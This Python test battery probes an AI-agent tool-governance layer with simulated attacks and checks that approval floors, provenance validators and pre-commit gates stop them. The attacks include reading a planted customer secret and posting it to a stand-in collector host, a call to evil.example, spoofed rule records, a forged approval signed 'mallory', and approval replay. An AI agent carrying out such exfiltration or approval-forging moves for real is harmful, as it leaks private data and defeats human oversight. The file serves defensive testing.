"""Wave-79 break-first probes (2026-09-22): rules-tiering slice.

Theme: the rules-layer slice of the learnings memo (Part 1 + Part 2) —
lethal-trifecta tiering as a policy primitive, total policy_version +
matched_rules, and pre-commit validation for irreversible actions.

Break-first: every attack probe must end with the tiering rule, the
totality gate, or the pre-commit gate refusing fail-closed and loud,
or the attack being impossible by construction. Verdict "stopped"
means the ATTACK was stopped; "break" means the wave-79 layer failed
to catch it; "residual" means a documented classification boundary
(the fix is reclassification through the governed path, not a code
change).

The trifecta floor is an explicit deployment opt-in
(`ToolExecutor(..., trifecta_floor=True)`; default off, zero behavior
change): the probes that assert floor/escalation behavior enable it,
and the battery also pins that the default-off path leaves policy
verdicts untouched.

  TRIFECTA EVASION:
    trifecta_single_tool_assembly -- api_call alone holds all three
      axes; an elevated session's allowlisted api_call is queued by
      the trifecta floor even though the policy allows it.
    trifecta_multi_tool_composition -- read_file + send_email are each
      innocent alone; together they complete the trifecta and the
      external-comm tool is queued by the floor.
    trifecta_cross_hop_composition -- parent session holds two axes;
      the child session adds the third; the child's first external
      call trips the floor (attenuation untouched).
    mislabeled_tool_enforcement_holds -- incident-class probe: api_call
      mislabeled as axis-clean; read->api_call exfil is STILL queued
      by read-before-send correlation (labels only escalate, never
      weaken enforcement); only the tier escalation is lost, and the
      fix is reclassification.
  MATCHED-RULES GAMES:
    matched_rules_spoof_ignored -- a caller-injected matched_rules
      kwarg never reaches the decision record; the record carries the
      engine's list.
    missing_fields_fail_closed -- the provenance validator refuses
      records missing policy_version/matched_rules; the approvals
      choke point auto-stamps decision entries.
  IRREVERSIBLE-ACTION BYPASS:
    unflagged_irreversible_executes -- write_file destructive
      overwrite executes with the gate installed: a CLASSIFICATION
      boundary (residual, documented), not a bypass; the fix is
      reclassification through the governed path.
    precommit_preview_mismatch_refused -- approved preview A,
      executed B: refused, nothing executes.
    precommit_approval_replay_refused -- one bound approval, two
      calls: the second is refused (single-use).
    precommit_governed_change_bypass_refused -- no public mutator on
      the frozen registry; a forged applied record is refused; a
      well-formed wave-75 applied record authorizes the change.
  FLOOR SOUNDNESS:
    trifecta_floor_does_not_weaken_deny -- policy deny still denies
      in an elevated session (the floor only overrides allow).

All runs synthetic/local, $0. Deterministic except wall-clock ts
(never asserted on).
"""

import contextlib
import io
import os
import sys
import tempfile
from contextlib import redirect_stderr
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))
sys.path.insert(0, str(REPO_ROOT / "tests"))

from gov import log as log_mod  # noqa: E402
from gov import precommit as pc_mod  # noqa: E402
from gov import provenance as prov_mod  # noqa: E402
from gov import rules_tiering as rt_mod  # noqa: E402
from harness import make_run, plant_file  # noqa: E402

RESULTS = []
SITUATIONS = {}


@contextlib.contextmanager
def _env(**pairs):
    saved = {k: os.environ.get(k) for k in pairs}
    had = {k: k in os.environ for k in pairs}
    for k, v in pairs.items():
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = v
    try:
        yield
    finally:
        for k in pairs:
            if had[k]:
                os.environ[k] = saved[k]
            else:
                os.environ.pop(k, None)


@contextlib.contextmanager
def _dev_keys(enabled=True):
    prev = log_mod._dev_enabled
    prev_warned = log_mod._dev_warned
    log_mod._dev_enabled = enabled
    log_mod._dev_warned = False
    try:
        yield
    finally:
        log_mod._dev_enabled = prev
        log_mod._dev_warned = prev_warned


@contextlib.contextmanager
def _govrun():
    old = os.environ.get("TMPDIR")
    old_cached = tempfile.tempdir
    os.environ["TMPDIR"] = "/tmp/gov-run"
    tempfile.tempdir = None
    run_tmp = tempfile.mkdtemp(prefix="w79probe-")
    try:
        yield run_tmp
    finally:
        if old is None:
            os.environ.pop("TMPDIR", None)
        else:
            os.environ["TMPDIR"] = old
        tempfile.tempdir = old_cached
        import shutil
        shutil.rmtree(run_tmp, ignore_errors=True)


def _sit(sid):
    def deco(fn):
        def wrapper():
            try:
                with _govrun():
                    with _env(GOV_DEV_KEYS="1",
                              GOV_DEPLOYMENT_MODE="staging"):
                        with _dev_keys(True):
                            with redirect_stderr(io.StringIO()):
                                detail = fn()
                if not isinstance(detail, dict) or \
                        detail.get("verdict") not in (
                            "stopped", "break", "residual"):
                    detail = {"verdict": "break",
                              "note": "probe returned no verdict: %r"
                              % (detail,)}
            except Exception as exc:  # noqa: BLE001 -- one bad probe
                detail = {"verdict": "break",
                          "note": "probe raised %s: %s"
                          % (type(exc).__name__, exc)}
            RESULTS.append({"id": sid, "verdict": detail["verdict"],
                            "detail": detail})
        SITUATIONS[sid] = wrapper
        return wrapper
    return deco


def _entries(ctx):
    return ctx["read_log"]()


# ---------------------------------------------------------------------------
# Trifecta evasion
# ---------------------------------------------------------------------------

@_sit("sit_trifecta_single_tool_assembly")
def sit_trifecta_single_tool_assembly():
    """api_call alone holds all three axes: an elevated session's
    allowlisted api_call is queued by the trifecta floor even though
    the policy verdict is allow."""
    ctx = make_run(trifecta_floor=True)
    ident = ctx["mint_identity"]("coder-1", "coder", "dev-org")
    r = ctx["executor"].call(
        ident, "api_call",
        endpoint="https://synthetic.local/v1/data", params={})
    if r["status"] != "queued":
        return {"verdict": "break",
                "note": "elevated api_call executed instead of queuing: "
                        "%r" % r["status"]}
    queued = [e for e in _entries(ctx)
              if e.get("decision") == "queued_pending"]
    if not queued or queued[-1].get("flag") != "trifecta_floor":
        return {"verdict": "break",
                "note": "queue entry missing trifecta_floor flag"}
    if rt_mod.TRIFECTA_FLOOR_SENTINEL not in queued[-1]["matched_rules"]:
        return {"verdict": "break",
                "note": "floor sentinel missing from matched_rules"}
    return {"verdict": "stopped",
            "note": "single-tool trifecta (api_call) queued by the "
                    "approval floor; engine rule + sentinel both named"}


@_sit("sit_trifecta_multi_tool_composition")
def sit_trifecta_multi_tool_composition():
    """No single tool is the trifecta, but the role's GRANT SET composes
    all three axes (read_file: private+untrusted; http_post/send_email:
    external). The session is elevated at its first call with a loud
    escalation record — the composition is caught at the tier, not the
    tool. Contrast: the triage role (two axes) never escalates."""
    t_read = rt_mod.session_tier({"read_file"})[0]
    t_post = rt_mod.session_tier({"http_post"})[0]
    t_union = rt_mod.session_tier({"read_file", "http_post"})[0]
    if t_read != "standard" or t_post != "standard":
        return {"verdict": "break",
                "note": "single tools wrongly elevated"}
    if t_union != "elevated":
        return {"verdict": "break",
                "note": "grant composition did not reach elevated"}
    ctx = make_run(trifecta_floor=True)
    ident = ctx["mint_identity"]("publisher-1", "publisher", "media-org")
    plant_file(ctx, "data/n.txt", "hello")
    r1 = ctx["executor"].call(ident, "read_file", path="data/n.txt")
    if r1["status"] != "executed":
        return {"verdict": "break",
                "note": "non-external tool wrongly gated: %r"
                        % r1["status"]}
    esc = [e for e in _entries(ctx)
           if e.get("decision") == "tier_escalated"]
    if not esc:
        return {"verdict": "break",
                "note": "composed trifecta produced no escalation record"}
    ctx2 = make_run(trifecta_floor=True)
    ident2 = ctx2["mint_identity"]("triage-1", "triage", "ops-org")
    plant_file(ctx2, "data/n.txt", "hello")
    ctx2["executor"].call(ident2, "read_file", path="data/n.txt")
    if [e for e in _entries(ctx2)
            if e.get("decision") == "tier_escalated"]:
        return {"verdict": "break",
                "note": "two-axis role wrongly escalated"}
    return {"verdict": "stopped",
            "note": "three-axis grant composition (no single trifecta "
                    "tool) escalated the tier loudly; two-axis role did "
                    "not"}


@_sit("sit_trifecta_cross_hop_composition")
def sit_trifecta_cross_hop_composition():
    """Parent session holds two axes (triage); the child session adds
    the third (researcher). The child's first external call trips the
    floor. Wave-74 attenuation is untouched — the tier composes over
    effective grants, not token scopes."""
    ctx = make_run(trifecta_floor=True)
    parent = ctx["mint_identity"]("parent-1", "triage", "ops-org")
    plant_file(ctx, "data/n.txt", "hello")
    rp = ctx["executor"].call(parent, "read_file", path="data/n.txt")
    if rp["status"] != "executed":
        return {"verdict": "break", "note": "parent read failed"}
    if [e for e in _entries(ctx)
            if e.get("decision") == "tier_escalated"]:
        return {"verdict": "break",
                "note": "two-axis parent session wrongly escalated"}
    child = ctx["mint_identity"]("child-1", "researcher", "ops-org")
    rc = ctx["executor"].call(
        child, "api_call",
        endpoint="https://synthetic.local/v1/data", params={})
    if rc["status"] != "queued":
        return {"verdict": "break",
                "note": "cross-hop trifecta did not trip the floor: %r"
                        % rc["status"]}
    esc = [e for e in _entries(ctx)
           if e.get("decision") == "tier_escalated"]
    if not esc:
        return {"verdict": "break",
                "note": "no loud escalation record chained"}
    return {"verdict": "stopped",
            "note": "cross-hop composition tripped the tier with a "
                    "chained escalation record; attenuation untouched"}


@_sit("sit_mislabeled_tool_enforcement_holds")
def sit_mislabeled_tool_enforcement_holds():
    """INCIDENT-CLASS probe: api_call mislabeled as axis-clean. The
    read->api_call exfil is STILL queued by read-before-send
    correlation — labels only escalate, never weaken enforcement.
    Only the tier escalation is lost; the fix is reclassification.

    To isolate the mislabel's effect the probe uses the scout role
    (read_file + api_call): with api_call mislabeled axis-clean the
    grant union drops to two axes, so no tier escalation — while the
    read->api_call exfil is STILL queued by read-before-send
    correlation. Labels only escalate, never weaken enforcement."""
    saved = rt_mod.TOOL_AXES["api_call"]
    rt_mod.TOOL_AXES["api_call"] = frozenset()
    try:
        ctx = make_run(trifecta_floor=True)
        ident = ctx["mint_identity"]("scout-1", "scout", "scout-org")
        secret = "customer-record-9917 alpha bravo charlie delta"
        plant_file(ctx, "data/c.csv", secret)
        ctx["executor"].call(ident, "read_file", path="data/c.csv")
        r = ctx["executor"].call(
            ident, "api_call",
            endpoint="https://collector.synthetic.local/v1/ingest",
            params={"batch": secret})
        if r["status"] != "queued":
            return {"verdict": "break",
                    "note": "mislabeled tool exfiltrated without "
                            "approval: %r" % r["status"]}
        queued = [e for e in _entries(ctx)
                  if e.get("decision") == "queued_pending"]
        if queued[-1].get("flag") != "read_before_send":
            return {"verdict": "break",
                    "note": "queued but not by read-before-send: %r"
                            % queued[-1].get("flag")}
        if [e for e in _entries(ctx)
                if e.get("decision") == "tier_escalated"]:
            return {"verdict": "break",
                    "note": "mislabeled tool wrongly escalated the tier"}
    finally:
        rt_mod.TOOL_AXES["api_call"] = saved
    return {"verdict": "stopped",
            "note": "mislabel could not weaken enforcement "
                    "(read-before-send still queued); the lost tier "
                    "escalation is fixed by reclassification"}


# ---------------------------------------------------------------------------
# matched_rules games
# ---------------------------------------------------------------------------

@_sit("sit_matched_rules_spoof_ignored")
def sit_matched_rules_spoof_ignored():
    """A caller-injected matched_rules kwarg never reaches the decision
    record: the record carries the engine's list, not caller input."""
    ctx = make_run()
    ident = ctx["mint_identity"]("triage-1", "triage", "ops-org")
    plant_file(ctx, "data/n.txt", "hello")
    r = ctx["executor"].call(ident, "read_file", path="data/n.txt",
                             matched_rules=["attacker-rule"])
    if r["status"] != "executed":
        return {"verdict": "break", "note": "call failed: %r" % r}
    auth = [e for e in _entries(ctx)
            if e.get("decision") == "execution_authorized"]
    if not auth:
        return {"verdict": "break", "note": "no verdict entry"}
    if "attacker-rule" in auth[-1]["matched_rules"]:
        return {"verdict": "break",
                "note": "spoofed matched_rules reached the record"}
    if auth[-1]["matched_rules"] != ["allow-sandbox-reads"]:
        return {"verdict": "break",
                "note": "wrong matched_rules: %r"
                        % auth[-1]["matched_rules"]}
    return {"verdict": "stopped",
            "note": "injected matched_rules ignored; record carries the "
                    "engine's rule id"}


@_sit("sit_missing_fields_fail_closed")
def sit_missing_fields_fail_closed():
    """The totality build gate: the provenance validator refuses
    records missing policy_version/matched_rules, and the approvals
    choke point auto-stamps decision entries."""
    import tempfile
    tmpd = tempfile.mkdtemp(prefix="w79prov-")
    try:
        from gov.log import ActionLog
        log = ActionLog(str(Path(tmpd) / "a.jsonl"))
        base = {
            "schema_version": 1, "session_id": "s-1",
            "session_open": "2026-09-22T00:00:00+00:00",
            "clock_source": "test",
            "principal": {"kind": "service", "ref": "t"},
            "delegation": {"delegation_schema_version": 1, "hops": [],
                           "no_delegation_reason": "t"},
            "record_type": "decision",
            "action": {"tool": "read_file"},
            "outcome": {"status": "ok"},
            "payload_tier": "decision",
            "retention": {"class": "decision",
                          "until": "2027-09-22T00:00:00+00:00",
                          "policy": "t"},
            "matched_rules": ["r1"],
        }
        try:
            prov_mod.append_provenance(log, {"event": "x",
                                             "prov": dict(base)})
            return {"verdict": "break",
                    "note": "record without policy_version appended"}
        except prov_mod.ProvenanceError:
            pass
        no_mr = dict(base, policy_version="2")
        del no_mr["matched_rules"]
        try:
            prov_mod.append_provenance(log, {"event": "x",
                                             "prov": no_mr})
            return {"verdict": "break",
                    "note": "record without matched_rules appended"}
        except prov_mod.ProvenanceError:
            pass
    finally:
        import shutil
        shutil.rmtree(tmpd, ignore_errors=True)
    ctx = make_run()
    stamped = ctx["approvals"]._log({"event": "x", "decision": "denied"})
    if stamped.get("policy_version") != "approvals-d1" or \
            stamped.get("matched_rules") != []:
        return {"verdict": "break",
                "note": "approvals choke point did not stamp"}
    return {"verdict": "stopped",
            "note": "validator refuses field-less records; the choke "
                    "point stamps what it is given"}


# ---------------------------------------------------------------------------
# Irreversible-action bypass
# ---------------------------------------------------------------------------

@_sit("sit_unflagged_irreversible_executes")
def sit_unflagged_irreversible_executes():
    """CLASSIFICATION BOUNDARY (residual, documented): write_file is
    classified reversible (overwrite is the inverse), so a destructive
    overwrite executes with the pre-commit gate installed and no
    preview. This is the procedure working as designed — the fix, if a
    deployment wants the gate here, is reclassification through the
    governed path, not a code change."""
    gate = pc_mod.PrecommitGate()
    ctx = make_run(precommit_gate=gate)
    ident = ctx["mint_identity"]("coder-1", "coder", "dev-org")
    plant_file(ctx, "data/v.txt", "original-critical-content")
    r = ctx["executor"].call(ident, "write_file", path="data/v.txt",
                             content="DESTROYED")
    if r["status"] != "executed":
        return {"verdict": "break",
                "note": "expected the classification boundary to show, "
                        "got %r" % r["status"]}
    return {"verdict": "residual",
            "note": "write_file destructive overwrite executes: "
                    "classification boundary (reversible by the no-inverse "
                    "test); reclassify via the governed path to gate it"}


@_sit("sit_precommit_preview_mismatch_refused")
def sit_precommit_preview_mismatch_refused():
    """Approved preview A, executed B: refused, nothing executes."""
    gate = pc_mod.PrecommitGate()
    ctx = make_run(precommit_gate=gate)
    ident = ctx["mint_identity"]("coder-1", "coder", "dev-org")
    plant_file(ctx, "data/a.txt", "a")
    plant_file(ctx, "data/b.txt", "b")
    preview = gate.preview("delete_file", {"path": "data/a.txt"})
    approval = gate.approve(preview["preview_id"], "human-op")
    r = ctx["executor"].call(
        ident, "delete_file", path="data/b.txt",
        precommit_approval_id=approval["approval_id"])
    if r["status"] != "denied" or r["policy_id"] != "precommit-required":
        return {"verdict": "break",
                "note": "preview/execution mismatch not refused: %r" % r}
    return {"verdict": "stopped",
            "note": "approved-A/executed-B refused fail-closed before "
                    "the tool ran"}


@_sit("sit_precommit_approval_replay_refused")
def sit_precommit_approval_replay_refused():
    """One bound approval, two identical calls: the second is refused
    (single-use tickets)."""
    gate = pc_mod.PrecommitGate()
    ctx = make_run(precommit_gate=gate)
    ident = ctx["mint_identity"]("coder-1", "coder", "dev-org")
    plant_file(ctx, "data/a.txt", "a")
    preview = gate.preview("delete_file", {"path": "data/a.txt"})
    approval = gate.approve(preview["preview_id"], "human-op")
    r1 = ctx["executor"].call(
        ident, "delete_file", path="data/a.txt",
        precommit_approval_id=approval["approval_id"])
    if r1["status"] != "executed":
        return {"verdict": "break",
                "note": "first commit failed: %r" % r1}
    plant_file(ctx, "data/a.txt", "a2")
    r2 = ctx["executor"].call(
        ident, "delete_file", path="data/a.txt",
        precommit_approval_id=approval["approval_id"])
    if r2["status"] != "denied" or \
            r2["policy_id"] != "precommit-required":
        return {"verdict": "break",
                "note": "replayed approval not refused: %r" % r2}
    return {"verdict": "stopped",
            "note": "single-use ticket consumed by the first commit; "
                    "replay refused"}


@_sit("sit_precommit_governed_change_bypass_refused")
def sit_precommit_governed_change_bypass_refused():
    """The registry has no public mutator; apply_governed_change
    refuses a forged applied record and honors a well-formed wave-75
    applied record binding the exact mutation."""
    if hasattr(pc_mod, "add_tool") or hasattr(pc_mod, "remove_tool") \
            or hasattr(pc_mod, "set_registry"):
        return {"verdict": "break",
                "note": "public mutator exists on the registry"}
    saved = dict(pc_mod._IRREVERSIBLE)
    try:
        mutation = {"add": {}, "remove": ["send_email"]}
        forged = {"prov": {
            "record_type": "policy_change",
            "policy": {"status": "applied",
                       "diff_summary": "unbound summary"},
            "approvals": [{"approval_id": "a1", "decision": "approve",
                           "decided_by": "mallory",
                           "decided_at": "2026-09-22T00:00:00Z"}],
            "authorship_ref": "x"}}
        try:
            pc_mod.apply_governed_change(mutation, forged)
            return {"verdict": "break",
                    "note": "forged applied record authorized a mutation"}
        except pc_mod.PrecommitRefused:
            pass
        if not pc_mod.is_irreversible("send_email"):
            return {"verdict": "break",
                    "note": "forged record mutated the registry"}
        digest = pc_mod._mutation_digest(mutation)
        legit = {"prov": {
            "record_type": "policy_change",
            "policy": {"status": "applied",
                       "diff_summary": "reclassify: irreversible-registry:"
                                      + digest},
            "approvals": [{"approval_id": "a1", "decision": "approve",
                           "decided_by": "human-a",
                           "decided_at": "2026-09-22T00:00:00Z"}],
            "authorship_ref": "auth-ref"}}
        pc_mod.apply_governed_change(mutation, legit)
        if pc_mod.is_irreversible("send_email"):
            return {"verdict": "break",
                    "note": "well-formed governed change did not apply"}
    finally:
        pc_mod._IRREVERSIBLE.clear()
        pc_mod._IRREVERSIBLE.update(saved)
    if not pc_mod.is_irreversible("send_email"):
        return {"verdict": "break",
                "note": "registry not restored after probe"}
    return {"verdict": "stopped",
            "note": "no public mutator; forged record refused; the "
                    "wave-75 governed path authorizes the exact mutation"}


# ---------------------------------------------------------------------------
# Floor soundness
# ---------------------------------------------------------------------------

@_sit("sit_trifecta_floor_does_not_weaken_deny")
def sit_trifecta_floor_does_not_weaken_deny():
    """Policy deny still denies in an elevated session: the floor only
    ever overrides allow, never deny."""
    ctx = make_run(trifecta_floor=True)
    ident = ctx["mint_identity"]("coder-1", "coder", "dev-org")
    r = ctx["executor"].call(
        ident, "api_call",
        endpoint="https://evil.example/v1/data", params={})
    if r["status"] != "denied":
        return {"verdict": "break",
                "note": "deny weakened in elevated session: %r"
                        % r["status"]}
    denied = [e for e in _entries(ctx)
              if e.get("decision") == "denied"]
    if denied[-1].get("flag") == "trifecta_floor":
        return {"verdict": "break",
                "note": "floor flag on a deny verdict"}
    return {"verdict": "stopped",
            "note": "deny wins over the floor; the floor only overrides "
                    "allow"}


def main():
    for sid, fn in SITUATIONS.items():
        fn()
    held = sum(1 for r in RESULTS if r["verdict"] == "stopped")
    boundaries = sum(1 for r in RESULTS if r["verdict"] == "residual")
    missed = sum(1 for r in RESULTS if r["verdict"] == "break")
    print("wave-79 battery: %d stopped / %d residual / %d break "
          "of %d" % (held, boundaries, missed, len(RESULTS)))
    for r in RESULTS:
        print("  [%s] %s -- %s" % (
            r["verdict"].upper(), r["id"],
            r["detail"].get("note", "")))
    return 0 if missed == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
